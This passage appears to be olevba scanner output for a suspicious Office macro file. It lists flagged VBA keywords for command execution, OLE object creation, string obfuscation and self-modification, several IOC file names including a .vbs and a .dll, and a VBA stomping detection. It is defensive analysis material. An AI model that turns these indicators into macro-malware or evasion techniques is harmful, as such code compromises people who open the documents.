|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|createobject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |ad.dll              |Executable file name                         |
|IOC       |Borika.vbs          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

